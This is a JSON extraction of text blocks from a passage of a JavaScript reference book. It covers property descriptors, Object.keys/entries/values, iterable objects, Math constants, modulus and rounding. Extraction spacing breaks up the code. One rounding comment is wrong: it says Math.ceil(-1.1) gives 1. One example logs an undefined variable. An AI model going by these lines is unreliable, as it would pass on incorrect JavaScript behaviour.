        "text": "Using property descriptors we can make a property read only, and any attempt to change its value will fail silently, the value will not be changed and no error will be thrown. The  writable  property in a property descriptor indicates whether that property can be changed or not.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a   =   {   }; Object. defineProperty ( a ,   'foo' ,   {  value :   'original' ,  writable :   false   }); a. foo   =   'new' ; console. log ( a. foo );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Console output original",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.15: Non enumerable property",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "We can avoid a property from showing up in  for   ( ...  in  ... )  loops The  enumerable  property of the property descriptor tells whether that property will be enumerated while looping through the object's properties.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   {   }; Object. defineProperty ( obj ,   \"foo\" ,   {  value :   'show' ,  enumerable :   true   }); Object. defineProperty ( obj ,   \"bar\" ,   {  value :   'hide' ,  enumerable :   false   }); for   ( var  prop  in  obj )   {     console. log ( obj [ prop ]); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Console output show",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.16: Lock property description",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "A property's descriptor can be locked so no changes can be made to it. It will still be possible to use the property normally, assigning and retrieving the value from it, but any attempt to rede\ufb01ne it will throw an exception. The  configurable  property of the property descriptor is used to disallow any further changes on the descriptor.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 124",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   {};",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Define 'foo' as read only and lock it",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Object. defineProperty ( obj ,   \"foo\" ,   {     value :   \"original value\" ,     writable :   false ,     configurable :   false });   Object. defineProperty ( obj ,   \"foo\" ,   { writable :   true });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This error will be thrown: TypeError: Cannot rede\ufb01ne property: foo And the property will still be read only.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "obj. foo   =   \"new value\" ; console. log ( foo );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Console output original value",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.17: Object.getOwnPropertyDescriptor",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Get the description of a speci\ufb01c property in an object.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  sampleObject  =   {     hello :   'world' }; Object. getOwnPropertyDescriptor ( sampleObject ,   'hello' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Object {value: \"world\", writable: true, enumerable: true, configurable: true}",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 13.18: Descriptors and Named Properties",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Properties are members of an object. Each named property is a pair of (name, descriptor). The name is a string that allows access (using the dot notation  object. propertyName  or the square brackets notation object [ 'propertyName' ] ). The descriptor is a record of \ufb01elds de\ufb01ning the bevahiour of the property when it is accessed (what happens to the property and what is the value returned from accessing it). By and large, a property associates a name to a behavior (we can think of the behavior as a black box). There are two types of named properties: data property : the property's name is associated with a value. 1. accessor property : the property's name is associated with one or two accessor functions. 2. Demonstration:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "obj. propertyName1   =   5 ;   //translates behind the scenes into                         //either assigning 5 to the value field* if it is a data property                  //or calling the set function with the parameter 5 if accessor property",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 125",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "//*actually whether an assignment would take place in the case of a data property //also depends on the presence and value of the writable field - on that later on",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The property's type is determined by its descriptor's \ufb01elds, and a property cannot be of both types.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Data descriptors  -",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Required \ufb01elds:  value  or  writable  or both",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Optional \ufb01elds: configurable , enumerable",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample: {",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "   value :   10 ,    writable :   true ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Accessor descriptors  -",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Required \ufb01elds:  get  or  set  or both",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Optional \ufb01elds:  configurable ,  enumerable",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample: {",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     get :   function   ()   {          return   10 ;      },     enumerable :   true }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "meaning of \ufb01elds and their defaults",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "configurable , enumerable  and  writable :",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "These keys all default to  false . configurable  is  true  if and only if the type of this property descriptor may be changed and if the property may be deleted from the corresponding object. enumerable  is  true  if and only if this property shows up during enumeration of the properties on the corresponding object. writable  is  true  if and only if the value associated with the property may be changed with an assignment operator.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "get  and  set :",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "These keys default to  undefined . get  is a function which serves as a getter for the property, or  undefined  if there is no getter. The function return will be used as the value of the property. set  is a function which serves as a setter for the property, or  undefined  if there is no setter. The function will receive as only argument the new value being assigned to the property.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "value :",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This key defaults to  undefined . The value associated with the property. Can be any valid JavaScript value (number, object, function, etc). Example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 126",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     var  obj  =   { propertyName1 :   1 };   //the pair is actually ('propertyName1', {value:1,",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "                                                                     // writable:true,                                                                      // enumerable:true,                                                                      // configurable:true})     Object. defineProperty ( obj ,   'propertyName2' ,   { get :   function ()   {                                                     console. log ( 'this will be logged '   +                                   'every time propertyName2 is accessed to get its value' );                                                  },                                              set :   function ()   {                                                     console. log ( 'and this will be logged '   +                                  'every time propertyName2 \\' s value is tried to be set' )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "                       //will be treated like it has enumerable:false, configurable:false",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "                                                 }});",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//propertyName1 is the name of obj's data property //and propertyName2 is the name of its accessor property",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "obj. propertyName1   =   3 ; console. log ( obj. propertyName1 );   //3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "obj. propertyName2   =   3 ;   //and this will be logged every time propertyName2's value is tried to be set console. log ( obj. propertyName2 );   //this will be logged every time propertyName2 is accessed to get its value",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 13.19: Object.keys",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Object. keys ( obj )  returns an array of a given object's keys.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   {     a :   \"hello\" ,     b :   \"this is\" ,     c :   \"javascript!\" }; var  keys  =  Object. keys ( obj ); console. log ( keys );   // [\"a\", \"b\", \"c\"]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 13.20: Properties with special characters or reserved words",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "While object property notation is usually written as  myObject. property , this will only allow characters that are normally found in  JavaScript variable names , which is mainly letters, numbers and underscore ( _ ). If you need special characters, such as space,  \u263a , or user-provided content, this is possible using  []  bracket notation.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "myObject [ 'special property  \u263a ' ]   =   'it works!' console. log ( myObject [ 'special property  \u263a ' ])",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "All-digit properties:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "In addition to special characters, property names that are all-digits will require bracket notation. However, in this case the property need not be written as a string.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 127",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "myObject [ 123 ]   =   'hi!'   // number 123 is automatically converted to a string console. log ( myObject [ '123' ])   // notice how using string 123 produced the same result",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( myObject [ '12'   +   '3' ])   // string concatenation",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( myObject [ 120   +   3 ])   // arithmetic, still resulting in 123 and producing the same result console. log ( myObject [ 123.0 ])   // this works too because 123.0 evaluates to 123 console. log ( myObject [ '123.0' ])   // this does NOT work, because '123' != '123.0'",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "However, leading zeros are not recommended as that is interpreted as Octal notation. (TODO, we should produce and link to an example describing octal, hexadecimal and exponent notation) See also: [Arrays are Objects] example.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.21: Creating an Iterable object",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  myIterableObject  =   {};",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// An Iterable object must define a method located at the Symbol.iterator key:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "myIterableObject [ Symbol. iterator ]   =   function   ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // The iterator should return an Iterator object",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // The Iterator object must implement a method, next()",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    next :   function   ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       // next must itself return an IteratorResult object",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       if   (! this . iterated )   {          this . iterated   =   true ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // The IteratorResult object has two properties",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         return   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "           // whether the iteration is complete, and",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "          done :   false ,",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "           // the value of the current iteration",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "          value :   'One'          };        }        return   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // When iteration is complete, just the done property is needed",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        done :   true        };      },     iterated :   false    }; }; for   ( var  c of myIterableObject )   {   console. log ( c ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Console output One",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.22: Iterating over Object entries - Object.entries()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 8",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "The  proposed  Object. entries ()  method returns an array of key/value pairs for the given object. It does not return an iterator like  Array. prototype . entries () , but the Array returned by  Object. entries ()  can be iterated",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 128",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "regardless.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  obj  =   {     one :   1 ,     two :   2 ,     three :   3 }; Object. entries ( obj );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Results in: [",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     [ \"one\" ,   1 ],      [ \"two\" ,   2 ],      [ \"three\" ,   3 ] ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It is an useful way of iterating over the key/value pairs of an object:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for ( const   [ key ,  value ]  of Object. entries ( obj ))   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( key );   // \"one\", \"two\" and \"three\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( value );   // 1, 2 and 3 }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 13.23: Object.values()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 8",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "The  Object. values ()  method returns an array of a given object's own enumerable property values, in the same order as that provided by a for...in loop (the di\ufb00erence being that a for-in loop enumerates properties in the prototype chain as well).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   {   0 :   'a' ,   1 :   'b' ,   2 :   'c'   }; console. log ( Object. values ( obj ));   // ['a', 'b', 'c']",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "For browser support, please refer to this  link",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 129",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 14: Arithmetic (Math)",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 14.1: Constants",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Constants Description Approximate",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. E",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Base of natural logarithm  e 2.718",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. LN10",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Natural logarithm of 10 2.302",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. LN2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Natural logarithm of 2 0.693",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. LOG10E",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Base 10 logarithm of  e 0.434",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. LOG2E",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Base 2 logarithm of  e 1.442",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. PI",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Pi: the ratio of circle circumference to diameter ( \u03c0 ) 3.14",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. SQRT1_2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Square root of 1/2 0.707",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. SQRT2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Square root of 2 1.414",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Number. EPSILON",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Di\ufb00erence between one and the smallest value greater than one representable as a Number 2.2204460492503130808472633361816E-16",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Number. MAX_SAFE_INTEGER",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Largest integer  n  such that  n  and  n  +   1 are both exactly representable as a Number 2^53 - 1",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Number. MAX_VALUE",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Largest positive \ufb01nite value of Number 1.79E+308",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Number. MIN_SAFE_INTEGER",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Smallest integer  n  such that  n  and  n  -   1 are both exactly representable as a Number -(2^53 - 1)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Number. MIN_VALUE",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Smallest positive value for Number 5E-324 Number. NEGATIVE_INFINITY  Value of negative in\ufb01nity (- \u221e ) Number. POSITIVE_INFINITY  Value of positive in\ufb01nity ( \u221e )",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Infinity",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Value of positive in\ufb01nity ( \u221e )",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.2: Remainder / Modulus (%)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The remainder / modulus operator ( % ) returns the remainder after (integer) division.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log (   42   %    10 );   //  2 console. log (   42   %   - 10 );   //  2 console. log (- 42   %    10 );   // -2 console. log (- 42   %   - 10 );   // -2 console. log (- 40   %    10 );   // -0 console. log (   40   %    10 );   //  0",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This operator returns the remainder left over when one operand is divided by a second operand. When the \ufb01rst operand is a negative value, the return value will always be negative, and vice versa for positive values. In the example above,  10  can be subtracted four times from  42  before there is not enough left to subtract again without it changing sign. The remainder is thus:  42   -   4   *   10   =   2 . The remainder operator may be useful for the following problems: Test if an integer is (not) divisible by another number: 1.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": " x  %   4   ==   0   // true if x is divisible by 4  x  %   2   ==   0   // true if x is even number",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 130",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " x  %   2   !=   0   // true if x is odd number",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Since  0   ===   - 0 , this also works for  x  <=   - 0 . Implement cyclic increment/decrement of value within  [ 0 ,  n )  interval. 2. Suppose that we need to increment integer value from  0  to (but not including)  n , so the next value after  n - 1  become 0 . This can be done by such pseudocode:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  n  =  ... ;   // given n var  i  =   0 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  inc ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    i  =   ( i  +   1 )   %  n ; } while  ( true )   {     inc ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // update something with i }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Now generalize the above problem and suppose that we need to allow to both increment and decrement that value from  0  to (not including)  n , so the next value after  n - 1  become  0  and the previous value before  0  become  n - 1 .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  n  =  ... ;   // given n var  i  =   0 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  delta ( d )   {   // d - any signed integer     i  =   ( i  +  d  +  n )   %  n ;   // we add n to (i+d) to ensure the sum is positive }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Now we can call  delta ()  function passing any integer, both positive and negative, as delta parameter.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Using modulus to obtain the fractional part of a number",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  var  myNum  =   10   /   4 ;         // 2.5   var  fraction  =  myNum  %   1 ;   // 0.5  myNum  =   - 20   /   7 ;            // -2.857142857142857  fraction  =  myNum  %   1 ;       // -0.857142857142857",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 14.3: Rounding",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Rounding",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. round ()  will round the value to the closest integer using  half round up  to break ties.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =  Math. round ( 2.3 );         // a is now 2   var  b  =  Math. round ( 2.7 );         // b is now 3 var  c  =  Math. round ( 2.5 );         // c is now 3 But var  c  =  Math. round (- 2.7 );         // c is now -3 var  c  =  Math. round (- 2.5 );         // c is now -2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note how  - 2.5  is rounded to  -2 . This is because half-way values are always rounded up, that is they're rounded to the integer with the next higher value.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 131",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Rounding up",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. ceil ()  will round the value up.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =  Math. ceil ( 2.3 );          // a is now 3 var  b  =  Math. ceil ( 2.7 );          // b is now 3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "ceil ing a negative number will round towards zero",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  c  =  Math. ceil (- 1.1 );         // c is now 1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Rounding down",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. floor ()  will round the value down.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =  Math. floor ( 2.3 );          // a is now 2 var  b  =  Math. floor ( 2.7 );          // b is now 2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "floor ing a negative number will round it away from zero.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  c  =  Math. floor (- 1.1 );         // c is now -1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Truncating",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Caveat : using bitwise operators (except  >>> ) only applies to numbers between  - 2147483649  and  2147483648 .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "2.3    |   0 ;                         // 2 (floor) - 2.3   |   0 ;                         // -2 (ceil) NaN    |   0 ;                         // 0",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Math. trunc () Math. trunc ( 2.3 );                  // 2 (floor) Math. trunc (- 2.3 );                 // -2 (ceil) Math. trunc ( 2147483648.1 );         // 2147483648 (floor) Math. trunc (- 2147483649.1 );        // -2147483649 (ceil) Math. trunc ( NaN );                  // NaN",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Rounding to decimal places",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. floor ,  Math. ceil () , and  Math. round ()  can be used to round to a number of decimal places To round to 2 decimal places:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  var  myNum  =   2 / 3 ;                 // 0.6666666666666666   var  multiplier  =   100 ;   var  a  =  Math. round ( myNum  *  multiplier )   /  multiplier ;    // 0.67   var  b  =  Math. ceil   ( myNum  *  multiplier )   /  multiplier ;    // 0.67   var  c  =  Math. floor ( myNum  *  multiplier )   /  multiplier ;    // 0.66",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can also round to a number of digits:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  var  myNum  =   10000 / 3 ;             // 3333.3333333333335   var  multiplier  =   1 / 100 ;   var  a  =  Math. round ( myNum  *  multiplier )   /  multiplier ;    // 3300",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 132",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  var  b  =  Math. ceil   ( myNum  *  multiplier )   /  multiplier ;    // 3400   var  c  =  Math. floor ( myNum  *  multiplier )   /  multiplier ;    // 3300",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "As a more usable function:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  // value is the value to round   // places if positive the number of decimal places to round to   // places if negative the number of digits to round to",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  function  roundTo ( value ,  places ){       var  power  =  Math. pow ( 10 ,  places );       return  Math. round ( value  *  power )   /  power ;   }   var  myNum  =   10000 / 3 ;      // 3333.3333333333335  roundTo ( myNum ,   2 );    // 3333.33  roundTo ( myNum ,   0 );    // 3333  roundTo ( myNum ,   - 2 );   // 3300",
